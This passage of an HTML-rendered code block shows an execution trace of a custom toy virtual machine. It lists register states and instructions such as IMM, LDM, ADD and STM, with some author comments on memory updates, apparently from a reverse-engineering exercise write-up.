class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br></pre></td><td class="code"><pre><code class="hljs csharp">[<span class="hljs-meta">s</span>] ... <span class="hljs-keyword">return</span> <span class="hljs-keyword">value</span> (<span class="hljs-keyword">in</span> register d): <span class="hljs-number">0x4</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0</span> b:<span class="hljs-number">0x30</span> c:<span class="hljs-number">0x1b</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x2a</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x80</span> arg1:<span class="hljs-number">0x20</span> arg2:<span class="hljs-number">0</span><br>[<span class="hljs-meta">s</span>] STK c NONE<br>[<span class="hljs-meta">s</span>] ... popping c<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0</span> b:<span class="hljs-number">0x30</span> c:<span class="hljs-number">0x5</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x2</span> i:<span class="hljs-number">0x2b</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x80</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0</span><br>[<span class="hljs-meta">s</span>] STK b NONE<br>[<span class="hljs-meta">s</span>] ... popping b<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0</span> b:<span class="hljs-number">0xde</span> c:<span class="hljs-number">0x5</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x1</span> i:<span class="hljs-number">0x2c</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x80</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0</span><br>[<span class="hljs-meta">s</span>] STK a NONE<br>[<span class="hljs-meta">s</span>] ... popping a<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x1</span> b:<span class="hljs-number">0xde</span> c:<span class="hljs-number">0x5</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">0x2d</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x4</span> arg2:<span class="hljs-number">0x2d</span><br>[<span class="hljs-meta">s</span>] IMM i = <span class="hljs-number">0x2d</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x1</span> b:<span class="hljs-number">0xde</span> c:<span class="hljs-number">0x5</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">0x2e</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x80</span> arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0x2</span><br>[<span class="hljs-meta">s</span>] STK NONE a<br>[<span class="hljs-meta">s</span>] ... pushing a<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x1</span> b:<span class="hljs-number">0xde</span> c:<span class="hljs-number">0x5</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x1</span> i:<span class="hljs-number">0x2f</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x80</span> arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0x40</span><br>[<span class="hljs-meta">s</span>] STK NONE b<br>[<span class="hljs-meta">s</span>] ... pushing b<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x1</span> b:<span class="hljs-number">0xde</span> c:<span class="hljs-number">0x5</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x2</span> i:<span class="hljs-number">0x30</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x80</span> arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0x20</span><br>[<span class="hljs-meta">s</span>] STK NONE c<br>[<span class="hljs-meta">s</span>] ... pushing c<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x1</span> b:<span class="hljs-number">0xde</span> c:<span class="hljs-number">0x5</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x31</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x30</span><br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0x30</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x30</span> b:<span class="hljs-number">0xde</span> c:<span class="hljs-number">0x5</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x32</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x20</span> arg2:<span class="hljs-number">0xa5</span><br>[<span class="hljs-meta">s</span>] IMM c = <span class="hljs-number">0xa5</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x30</span> b:<span class="hljs-number">0xde</span> c:<span class="hljs-number">0xa5</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x33</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x40</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x2</span><br>[<span class="hljs-meta">s</span>] LDM b = *a<span class="hljs-meta"># a1[0x30] = 0x31</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x30</span> b:<span class="hljs-number">0x31</span> c:<span class="hljs-number">0xa5</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x34</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x4</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x20</span><br>[<span class="hljs-meta">s</span>] ADD b c<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x30</span> b:<span class="hljs-number">0xd6</span> c:<span class="hljs-number">0xa5</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x35</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x1</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x40</span><br>[<span class="hljs-meta">s</span>] STM *a = b<span class="hljs-meta"># a1[0x30] = 0x31 + 0xa5</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x30</span> b:<span class="hljs-number">0xd6</span> c:<span class="hljs-number">0xa5</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x36</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x31</span><br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0x31</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x31</span> b:<span class="hljs-number">0xd6</span> c:<span class="hljs-number">0xa5</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x37</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x20</span> arg2:<span class="hljs-number">0xce</span><br>[<span class="hljs-meta">s</span>] IMM c = <span class="hljs-number">0xce</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x31</span> b:<span class="hljs-number">0xd6</span> c:<span class="hljs-number">0xce</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x38</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x40</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x2</span><br>[<span class="hljs-meta">s</span>] LDM b = *a<span class="hljs-meta"># a1[0x31] = 0x32</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x31</span> b:<span class="hljs-number">0x32</span> c:<span class="hljs-number">0xce</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x39</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x4</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x20</span><br>[<span class="hljs-meta">s</span>] ADD b c<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x31</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">0xce</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x3a</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x1</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x40</span><br>[<span class="hljs-meta">s</span>] STM *a = b<span class="hljs-meta"># a1[0x31] = 0x32 + 0xce</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x31</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">0xce</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x3b</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x32</span><br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0x32</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x32</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">0xce</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x3c</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x20</span> arg2:<span class="hljs-number">0x67</span><br>[<span class="hljs-meta">s</span>] IMM c = <span class="hljs-number">0x67</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x32</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">0x67</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x3d</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x40</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x2</span><br>[<span class="hljs-meta">s</span>] LDM b = *a<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x32</span> b:<span class="hljs-number">0x33</span> c:<span class="hljs-number">0x67</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x3e</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x4</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x20</span><br>[<span class="hljs-meta">s</span>] ADD b c<span class="hljs-meta"># a1[0x32] = 0x33 + 0x67</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x32</span> b:<span class="hljs-number">0x9a</span> c:<span class="hljs-number">0x67</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x3f</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x1</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x40</span><br>[<span class="hljs-meta">s</span>] STM *a = b<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x32</span> b:<span class="hljs-number">0x9a</span> c:<span class="hljs-number">0x67</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x40</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x33</span><br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0x33</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x33</span> b:<span class="hljs-number">0x9a</span> c:<span class="hljs-number">0x67</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x41</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x20</span> arg2:<span class="hljs-number">0xab</span><br>[<span class="hljs-meta">s</span>] IMM c = <span class="hljs-number">0xab</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x33</span> b:<span class="hljs-number">0x9a</span> c:<span class="hljs-number">0xab</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x42</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x40</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x2</span><br>[<span class="hljs-meta">s</span>] LDM b = *a<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x33</span> b:<span class="hljs-number">0xa</span> c:<span class="hljs-number">0xab</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x43</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x4</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x20</span><br>[<span class="hljs-meta">s</span>] ADD b c<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x33</span> b:<span class="hljs-number">0xb5</span> c:<span class="hljs-number">0xab</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x44</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x1</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x40</span><br>[<span class="hljs-meta">s</span>] STM *a = b<span class="hljs-meta"># a1[0x33] = 0xa + 0xab</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x33</span> b:<span class="hljs-number">0xb5</span> c:<span class="hljs-number">0xab</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x45</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x34</span><br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0x34</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x34</span> b:<span class="hljs-number">0xb5</span> c:<span class="hljs-number">0xab</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x46</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x20</span> arg2:<span class="hljs-number">0x98</span><br>[<span class="hljs-meta">s</span>] IMM c = <span class="hljs-number">0x98</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x34</span> b:<span class="hljs-number">0xb5</span> c:<span class="hljs-number">0x98</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x47</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x40</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x2</span><br>[<span class="hljs-meta">s</span>] LDM b = *a<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x34</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">0x98</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x48</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x4</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x20</span><br>[<span class="hljs-meta">s</span>] ADD b c<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x34</span> b:<span class="hljs-number">0x98</span> c:<span class="hljs-number">0x98</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x49</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x1</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x40</span><br>[<span class="hljs-meta">s</span>] STM *a = b<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x34</span> b:<span class="hljs-number">0x98</span> c:<span class="hljs-number">0x98</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x4a</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x35</span><br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0x35</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x35</span> b:<span class="hljs-number">0x98</span> c:<span class="hljs-number">0x98</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x4b</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x20</span> arg2:<span class="hljs-number">0x46</span><br>[<span class="hljs-meta">s</span>] IMM c = <span class="hljs-number">0x46</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x35</span> b:<span class="hljs-number">0x98</span> c:<span class="hljs-number">0x46</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x4c</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x40</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x2</span><br>[<span class="hljs-meta">s</span>] LDM b = *a<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x35</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">0x46</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x4d</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x4</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x20</span><br>[<span class="hljs-meta">s</span>] ADD b c<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x35</span> b:<span class="hljs-number">0x46</span> c:<span class="hljs-number">0x46</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x4e</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x1</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x40</span><br>[<span class="hljs-meta">s</span>] STM *a = b<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x35</span> b:<span class="hljs-number">0x46</span> c:<span class="hljs-number">0x46</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x4f</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x36</span><br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0x36</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x36</span> b:<span class="hljs-number">0x46</span> c:<span class="hljs-number">0x46</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x50</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x20</span> arg2:<span class="hljs-number">0x63</span><br>[<span class="hljs-meta">s</span>] IMM c = <span class="hljs-number">0x63</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x36</span> b:<span class="hljs-number">0x46</span> c:<span class="hljs-number">0x63</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x51</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x40</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x2</span><br>[<span class="hljs-meta">s</span>] LDM b = *a<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x36</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">0x63</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x52</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x4</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x20</span><br>[<span class="hljs-meta">s</span>] ADD b c<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x36</span> b:<span class="hljs-number">0x63</span> c:<span class="hljs-number">0x63</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x53</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x1</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x40</span><br>[<span class="hljs-meta">s</span>] STM *a = b<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x36</span> b:<span class="hljs-number">0x63</span> c:<span class="hljs-number">0x63</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x54</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x37</span><br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0x37</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x37</span> b:<span class="hljs-number">0x63</span> c:<span class="hljs-number">0x63</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x55</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x20</span> arg2:<span class="hljs-number">0xe1</span><br>[<span class="hljs-meta">s</span>] IMM c = <span class="hljs-number">0xe1</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x37</span> b:<span class="hljs-number">0x63</span> c:<span class="hljs-number">0xe1</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x56</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x40</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x2</span><br>[<span class="hljs-meta">s</span>] LDM b = *a<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x37</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">0xe1</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x57</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x4</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x20</span><br>[<span class="hljs-meta">s</span>] ADD b c<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x37</span> b:<span class="hljs-number">0xe1</span> c:<span class="hljs-number">0xe1</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x58</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x1</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x40</span><br>[<span class="hljs-meta">s</span>] STM *a = b<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x37</span> b:<span class="hljs-number">0xe1</span> c:<span class="hljs-number">0xe1</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x59</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x38</span><br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0x38</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x38</span> b:<span class="hljs-number">0xe1</span> c:<span class="hljs-number">0xe1</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x5a</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x20</span> arg2:<span class="hljs-number">0x48</span><br>[<span class="hljs-meta">s</span>] IMM c = <span class="hljs-number">0x48</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x38</span> b:<span class="hljs-number">0xe1</span> c:<span class="hljs-number">0x48</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x5b</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x40</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x2</span><br>[<span class="hljs-meta">s</span>] LDM b = *a<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x38</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">0x48</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x5c</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x4</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x20</span><br>[<span class="hljs-meta">s</span>] ADD b c<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x38</span> b:<span class="hljs-number">0x48</span> c:<span class="hljs-number">0x48</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x5d</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x1</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x40</span><br>[<span class="hljs-meta">s</span>] STM *a = b<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x38</span> b:<span class="hljs-number">0x48</span> c:<span class="hljs-number">0x48</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x5e</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x39</span><br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0x39</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x39</span> b:<span class="hljs-number">0x48</span> c:<span class="hljs-number">0x48</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x5f</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x20</span> arg2:<span class="hljs-number">0x37</span><br>[<span class="hljs-meta">s</span>] IMM c = <span class="hljs-number">0x37</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x39</span> b:<span class="hljs-number">0x48</span> c:<span class="hljs-number">0x37</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x60</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x40</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x2</span><br>[<span class="hljs-meta">s</span>] LDM b = *a<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x39</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">0x37</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x61</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x4</span> arg1:<span 